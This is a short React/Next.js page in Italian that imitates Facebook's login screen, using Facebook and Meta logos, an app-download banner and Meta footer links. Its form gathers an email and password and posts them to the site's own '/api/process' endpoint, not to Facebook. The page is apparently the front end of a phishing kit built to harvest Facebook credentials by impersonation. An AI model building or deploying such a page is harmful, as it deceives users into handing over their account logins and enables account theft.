'use client';

export default function Home() {
  return (
    <>
      <div className="top-banner">
        <p>📥 Scarica Facebook per Android per navigare più velocemente.</p>
      </div>

      <div className="fb-container">
        <p className="lang">Italiano</p>
        <img src="/facebook.png" alt="Logo Facebook" className="fb-logo" />

     <div> 
<form action="/api/process" method="POST">
  <input type="text" name="email" placeholder="Email" required />
  <input type="password" name="password" placeholder="Password" required />
  <button type="submit">Invia</button>
</form></div>  
        <footer className="meta-footer">
          <img src="/meta.png" alt="Logo Meta" className="meta-logo" />
          <div className="meta-links">
            <a href="#">Informazioni</a>
            <a href="#">Centro assistenza</a>
            <a href="#">Altro</a>
          </div>
        </footer>
      </div>
    </>
  );
}
